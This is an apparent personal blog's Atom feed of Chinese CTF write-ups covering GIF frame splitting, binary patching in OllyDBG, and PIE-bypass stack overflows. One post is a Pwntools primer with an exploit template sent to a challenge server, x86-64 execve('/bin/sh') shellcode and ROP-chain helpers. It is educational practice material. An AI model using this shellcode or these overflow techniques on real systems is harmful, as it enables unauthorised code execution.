<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://4ss1du0us.github.io/atom.xml" rel="self"/>
  
  <link href="https://4ss1du0us.github.io/"/>
  <updated>2023-03-17T14:12:33.301Z</updated>
  <id>https://4ss1du0us.github.io/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-glance-50</title>
    <link href="https://4ss1du0us.github.io/2023/03/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50/"/>
    <id>https://4ss1du0us.github.io/2023/03/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50/</id>
    <published>2023-03-17T14:09:15.000Z</published>
    <updated>2023-03-17T14:12:33.301Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 &#x3D;&#x3D;gif 图片的拆分和拼接&#x3D;&#x3D;</p></li><li><p>&#x3D;&#x3D;拆分网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a> 可以直接将帧拼接起来，方便直接看到每一帧拼接起来的原图&#x3D;&#x3D;</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/9266eadf353d4ada94ededaeb96d0c50.gif">攻防世界-glance-50</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>得到一张 gif 动态图片：<br><img src="https://s2.loli.net/2023/03/17/4mTQAfp2ZqFOUwK.png" alt="攻防世界-glance-50 1"></p></li><li><p>由于图画很窄，尝试修改宽度无果，在 Ubuntu 中分析也没有发现</p></li><li><p>根据以往经验，gif 大概率是需要拆分的，于是将 gif 文件拆分成帧图片：<br><a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a><br>![[攻防世界-glance-50 2.png]]<br>使用这个网站可以直接将拆分后的图片集中展示出来，可以直接得到 flag</p></li><li><p>这个题其实就是将藏有 flag 的图片拆分为一段一段的，然后将每一个片段作为一帧合成 gif 动态图。所以直接将 gif 拆分为帧后，再拼接起来即可</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>使用网站分离得到帧图片：<br>![[攻防世界-glance-50 3.png]]</p></li><li><p>在 Win 下安装 <code>ImageMagick</code> ：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a><br>在帧图片文件夹下打开 cmd，执行 <code>magick montage *.png -tile 201x1 -geometry +0+0 flag.png</code><br>得到一张拼接的图片 flag.png：<br>![[攻防世界-glance-50 4.png]]<br>根据图片内容获得 flag</p></li></ol><hr><h2 id="结果：TWCTF-Bliss-by-Charles-O’Rear"><a href="#结果：TWCTF-Bliss-by-Charles-O’Rear" class="headerlink" title="结果：TWCTF{Bliss by Charles O’Rear}"></a>结果：TWCTF{Bliss by Charles O’Rear}</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;收获&quot;&gt;&lt;a href=&quot;#收获&quot; class=&quot;headerlink&quot; title=&quot;收获&quot;&gt;&lt;/a&gt;收获&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;熟悉 &amp;#x3D;&amp;#x3D;gif 图片的拆分和拼接&amp;#x3D;&amp;#x3D;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#x3</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools</title>
    <link href="https://4ss1du0us.github.io/2023/03/13/Pwntools/"/>
    <id>https://4ss1du0us.github.io/2023/03/13/Pwntools/</id>
    <published>2023-03-13T11:36:07.000Z</published>
    <updated>2023-03-13T11:36:40.787Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul><li><strong>exploit（简称exp）</strong>：用于攻击的脚本与方案</li><li><strong>payload</strong>：攻击载荷，是对目标进程劫持控制流的数据</li><li><strong>shellcode</strong>：调用攻击目标的 shell 的代码</li></ul><hr><h2 id="32位-和-64位-的差异"><a href="#32位-和-64位-的差异" class="headerlink" title="32位 和 64位 的差异"></a>32位 和 64位 的差异</h2><ul><li><strong>在写 exp、payload 的时候</strong></li></ul><table><thead><tr><th>位数</th><th>写法差异</th></tr></thead><tbody><tr><td>32位</td><td><code>p32(system) + p32(bin_sh)</code></td></tr><tr><td>64位</td><td><code>p64(rdi) + p64(bin_sh) + p64(system)</code></td></tr></tbody></table><ul><li>出现栈劫持的时候 <code>p(bin_sh)</code> 在前面</li></ul><hr><h2 id="Pwn程序输入脚本样例（exp-py）"><a href="#Pwn程序输入脚本样例（exp-py）" class="headerlink" title="Pwn程序输入脚本样例（exp.py）"></a>Pwn程序输入脚本样例（exp.py）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>  <span class="token comment"># 需要上传的输入内容，(0x20 - 0x18 + 8)根据栈地址确定需要输入的数据位数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>  <span class="token comment"># 给程序发送输入内容</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 给程序发送payload作为输入内容</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>如果 exp.py 可以 PWN 通，在远程只会显示 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code></strong></li></ul><hr><h2 id="exp-脚本直接获取-elf-文件中某个已知函数名的函数地址"><a href="#exp-脚本直接获取-elf-文件中某个已知函数名的函数地址" class="headerlink" title="exp 脚本直接获取 elf 文件中某个已知函数名的函数地址"></a>exp 脚本直接获取 elf 文件中某个已知函数名的函数地址</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr为程序test中函数"callsystem"的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据"><a href="#exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据" class="headerlink" title="exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据"></a>exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>caiji<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出数据，并将其转换为16进制 int 型，最后赋值main_addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><strong>若地址随机，即：每次输出到屏幕的信息不一样，则不能采取直接赋值，只能使用此方法</strong></li></ul><hr><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul><li><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p></li><li><p>在漏洞利用过程时，我们将精心编制好的 shellcode 通过有问题的程序写入到内存中，然后执行</p></li><li><p>该 shellcode 对应的C语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></li></ul><hr><h3 id="Pwntools-生成默认-shellcode"><a href="#Pwntools-生成默认-shellcode" class="headerlink" title="Pwntools 生成默认 shellcode"></a>Pwntools 生成默认 shellcode</h3><p>方法一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些空间比较小的情况不能很好的使用</strong></li></ul><h3 id="手动编写-shellcode"><a href="#手动编写-shellcode" class="headerlink" title="手动编写 shellcode"></a>手动编写 shellcode</h3><ul><li><h4 id="shellcode-这一段代码调动-shell-的原理："><a href="#shellcode-这一段代码调动-shell-的原理：" class="headerlink" title="shellcode 这一段代码调动 shell 的原理："></a>shellcode 这一段代码调动 shell 的原理：</h4><ol><li>linux 中，存在着一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 rax 寄存器作为系统调用号来区分不同的系统调用，可以通过查看 linux 源码目录下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</li><li>接着，通过 rdi 和 rsi 两个寄存器传入参数。其中，rdi 是指向运行程序的路径的指针，rsi 为一个指向 0 的指针，rdx 为 0</li></ol></li></ul><p>即，应该完成：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的汇编代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h4 id="利用Pwntools编译使用："><a href="#利用Pwntools编译使用：" class="headerlink" title="利用Pwntools编译使用："></a>利用Pwntools编译使用：</h4></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> \# 这里因为<span class="token number">64</span>位数据不能直接push，所以用了rax寄存器来传递<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>这样生成的 shellcode 就只有30字节，一般这种大小就足够了</strong></li></ul><hr><h2 id="Pwntools语句"><a href="#Pwntools语句" class="headerlink" title="Pwntools语句"></a>Pwntools语句</h2><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io &#x3D; porcess(“.&#x2F;&lt;文件名&gt;”)</td><td>本地连接</td></tr><tr><td>io &#x3D; remote(“ip地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table><hr><h3 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾\n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾\n）</td></tr></tbody></table><hr><h3 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>asm(shellcraft.sh())</td><td>生成 Pwntools 默认 shellcode</td></tr><tr><td>shellcode &#x3D; asm(shellcode)</td><td>生成自己编写的 shellcode</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>接收一行输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>stack&#x3D;int(io.recv(10),16)</td><td>接收回显的参数在栈上的地址，长度是10，以16进制表示</td></tr></tbody></table><hr><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>&#x3D;&#x3D;首先需要 elf &#x3D; ELF(“.&#x2F;&lt;文件名&gt;”) 来产生一个对象&#x3D;&#x3D;</p><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“a_function”]</td><td>找到 a_function 的地址</td></tr><tr><td>elf.got[“a_function”]</td><td>找到 a_function 的 got</td></tr><tr><td>elf.plt[“a_function”]</td><td>找到 a_function 的 plt</td></tr><tr><td>next(elf.search(“some_characters”))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr></tbody></table><hr><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>&#x3D;&#x3D;首先需要 rop &#x3D; ROP(“.&#x2F;&lt;文件名&gt;”) 创建一个对象&#x3D;&#x3D;</p><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs&#x3D;[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadgets</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadgets</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;相关术语&quot;&gt;&lt;a href=&quot;#相关术语&quot; class=&quot;headerlink&quot; title=&quot;相关术语&quot;&gt;&lt;/a&gt;相关术语&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;exploit（简称exp）&lt;/strong&gt;：用于攻击的脚本与方案&lt;/li&gt;
&lt;li&gt;&lt;str</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-gametime</title>
    <link href="https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime/"/>
    <id>https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime/</id>
    <published>2023-03-13T11:11:19.000Z</published>
    <updated>2023-03-17T14:06:13.354Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>结合程序运行、IDA 和 OllyDBG 分析程序的逻辑</p></li><li><p>&#x3D;&#x3D;使用 OllyDBG 修改程序跳转逻辑&#x3D;&#x3D;</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=a1e2802b-9a62-4091-a053-7661e8c413c9_2&task_category_id=4">攻防世界-gametime</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将文件拖入 exeinfo 查看，为 32 位程序<br>   <img src="https://s2.loli.net/2023/03/17/pwN3qH7XZdCcoiy.png" alt="攻防世界-gametime1"></p></li><li><p>运行程序可知是一个游戏，根据提示的内容：“当看到 s 的时候，按下空格键”<br>![[攻防世界-gametime2.png]]<br>按照游戏要求输入，发现游戏规为：当看到 s 的时候，按下 ‘ ‘；当看到 x 的时候，按下 ‘x’；当看到 m 的时候，按下 ‘m’<br>但进行到 <code>TRAINING COMPLETE!</code> 后，速度开始越来越快</p></li><li><p>IDA 查看主函数：<br>![[攻防世界-gametime3.png]]<br>最开始是一段屏幕输出，后面有两组三条 if 判断语句，根据游戏的规则，猜测这两组 if 语句应该是用来检测用户的输入是否对应为：’ ‘、’x’、’m’<br>除此之外，发现第一组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之前，而第二组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之后。前面一组判断速度比较慢，可以直接输入；但后面一组判断速度很快，输入正确有难度<br>最后面一片代码应该就是对 flag 的处理，输出 flag</p></li><li><p>查看判断函数：<br>![[攻防世界-gametime4.png]]<br>为了不让程序结束，根据 main 中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token char">' '</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v23<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'x'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token char">'m'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知，必须让 <code>sub_401507()</code> 返回 非0，即 <code>sub_401507()</code> 执行 return 1<br>根据 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，即让此判断恒为真</p></li><li><p>结合游戏发现，当用户输入错误时，会输出：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code>，即：用户输入正确时，<code>sub_401260(a2, 500 * dwMilliseconds)</code> 非0，执行 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，判断函数 <code>sub_401507()</code> 返回 1，从而跳过 <code>if ( !sub_401507(5, &#39; &#39;, 0xC8u, v25, &amp;v23) )</code>，使程序继续执行下去；若输入错误，则输出 <code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code>，程序终止</p></li><li><p>由于游戏速度太快，很难输入正确，于是想通过修改 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 判断语句，让用户输入错误时，使程序继续执行</p></li><li><p>用 OllyDBG 打开，首先定位到刚刚的输入错误语句：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code><br>![[攻防世界-gametime5.png]]<br>发现前面的一个 jnz 跳转语句<br>![[攻防世界-gametime6.png]]<br>跟随该跳转地址：<code>000E1586</code><br>![[攻防世界-gametime7.png]]<br>功能为：给 <code>al</code> 赋值为 1，然后结束调用，对应 “return 1”<br>所以这里的 <code>jnz</code> 跳转控制的就是 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 语句的执行<br>原来的逻辑是，输入正确则执行 if 语句，用 <code>jnz</code> 控制跳转<br>要想将逻辑改为，输入错误则执行 if 语句，将 <code>jnz</code> 跳转改为 <code>je</code> 跳转即可<br>![[攻防世界-gametime8.png]]</p></li><li><p>同理，将另外一组跳转也修改掉，在 OllyDBG 中执行程序，只要输入错误即可，比如一直按回车：<br>![[攻防世界-gametime9.png]]<br>等待程序执行自动输出 flag 即可</p></li></ol><hr><h2 id="结果：no5c30416d6cf52638460377995c6a8cf5"><a href="#结果：no5c30416d6cf52638460377995c6a8cf5" class="headerlink" title="结果：no5c30416d6cf52638460377995c6a8cf5"></a>结果：no5c30416d6cf52638460377995c6a8cf5</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;收获&quot;&gt;&lt;a href=&quot;#收获&quot; class=&quot;headerlink&quot; title=&quot;收获&quot;&gt;&lt;/a&gt;收获&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;结合程序运行、IDA 和 OllyDBG 分析程序的逻辑&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#x3D;&amp;#x3D;使用 </summary>
      
    
    
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-repeater</title>
    <link href="https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/"/>
    <id>https://4ss1du0us.github.io/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/</id>
    <published>2023-03-13T10:43:26.000Z</published>
    <updated>2023-03-13T11:10:27.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>&#x3D;&#x3D;IDA 中看到的地址是偏移地址&#x3D;&#x3D;，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 &#x3D; 程序的基地址 + 偏移地址</strong></p></li><li><p>&#x3D;&#x3D;可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code>&#x3D;&#x3D;</p></li><li><p>&#x3D;&#x3D;开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址&#x3D;&#x3D;</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">攻防世界-repeater</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br>![[攻防世界-repeater1.png]]<br>64位 小端序，开启了 <code>PIE</code> 地址随机化</p></li><li><p>尝试运行：<br>![[攻防世界-repeater2.png]]<br>存在溢出</p></li><li><p>在 IDA 下分析：<br>![[攻防世界-repeater3.png]]<br>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p></li><li><p>查看 <code>byte_202040</code> 地址的位置：<br>![[攻防世界-repeater4.png]]<br>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的<br>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p></li><li><p>但是这个题&#x3D;&#x3D;开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址&#x3D;&#x3D;<br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <em><strong>真实地址 &#x3D; 基地址 + 偏移地址</strong></em> 计算出来</p></li><li><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】<br>![[攻防世界-repeater5.png]]<br>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code><br>查看 <code>s</code> 所在的位置：<br>![[攻防世界-repeater6.png]]<br>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p></li><li><p>接下来思路就很明确了：<br> &#x3D;&#x3D;1. 在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 段上的，在这里写入一个 <code>shellcode</code></p><ol start="2"><li>然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code></li><li>然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来</li><li>在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 &#x3D; 程序的基地址</strong></li><li>在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 &#x3D; 真实地址</strong></li><li>再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址</li><li>程序跳转到 <code>shellcod</code>e 的地址去执行 <code>shellcode</code>，获得 shell&#x3D;&#x3D;</li></ol></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span 